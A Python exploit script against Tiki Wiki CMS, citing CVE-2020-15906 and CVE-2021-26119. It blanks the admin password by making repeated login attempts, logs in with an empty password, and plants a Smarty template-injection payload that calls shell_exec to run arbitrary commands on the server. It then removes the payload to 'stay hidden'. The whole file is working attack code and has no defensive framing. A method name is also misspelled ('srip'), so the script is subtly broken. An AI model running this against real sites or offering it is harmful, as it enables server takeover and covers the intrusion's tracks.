import requests
import re
import urllib3
urllib3.disable_warnings()
class Cve_2020_15906:
    def auth_bypass(self,s, t, d):
        h = {"referer": t}
        d["ticket"] = self.get_ticket(s, "%stiki-login.php" % t)
        d["pass"] = ""  # auth bypass is here
        r = s.post("%stiki-login.php" % t, data=d, headers=h)
        r = s.get("%stiki-admin.php" % t)
        assert ("You do not have the permission that is needed" not in r.text), "(-) authentication bypass failed!"


    def black_password(self,s, t, d):
        uri = "%stiki-login.php" % t
        # setup cookies here
        s.get(uri)
        ticket = self.get_ticket(s, uri)
        # crafted especially so unsuccessful_logins isn't recorded
        for i in range(0, 51):
            r = s.post(uri, d)
            if ("Account requires administrator approval." in r.text):
                print("(+) admin password blanked!")
                return
        raise Exception("(-) auth bypass failed!")


    def get_ticket(self,s, uri):
        h = {"referer": uri}
        r = s.get(uri)
        match = re.search('class="ticket" name="ticket" value="(.*)" \/>', r.text)
        assert match, "(-) csrf ticket leak failed!"
        return match.group(1)


    def trigger_or_patch_ssti(self,s, t, c=None):
        # CVE-2021-26119
        p = {"page": "look"}
        h = {"referer": t}
        bypass = "startrce{$smarty.template_object->smarty->disableSecurity()->display('string:{shell_exec(\"%s\")}')}endrce" % c
        d = {
            "ticket": self.get_ticket(s, "%stiki-admin.php" % t),
            "feature_custom_html_head_content": bypass if c else '',
            "lm_preference[]": "feature_custom_html_head_content"
        }
        r = s.post("%stiki-admin.php" % t, params=p, data=d, headers=h)
        r = s.get("%stiki-index.php" % t)
        if c != None:
            assert ("startrce" in r.text and "endrce" in r.text), "(-) rce failed!"
            cmdr = r.text.split("startrce")[1].split("endrce")[0]
            print(cmdr.strip())


    def main(self,target):
        u = target['url'].srip("/ ")
        p = "/tiki-login_scr.php"
        c = target["cmd"]
        p = p + "/" if not p.endswith("/") else p
        p = "/" + p if not p.startswith("/") else p
        t = u + p
        s = requests.Session()
        print("(+) blanking password...")
        d = {
            'user': 'admin',
            'pass': 'trololololol',
        }
        self.black_password(s, t, d)
        print("(+) getting a session...")
        self.auth_bypass(s, t, d)
        print("(+) auth bypass successful!")
        print("(+) triggering rce...\n")
        # trigger for rce
        self.trigger_or_patch_ssti(s, t, c)
        # patch so we stay hidden
        self.trigger_or_patch_ssti(s, t)

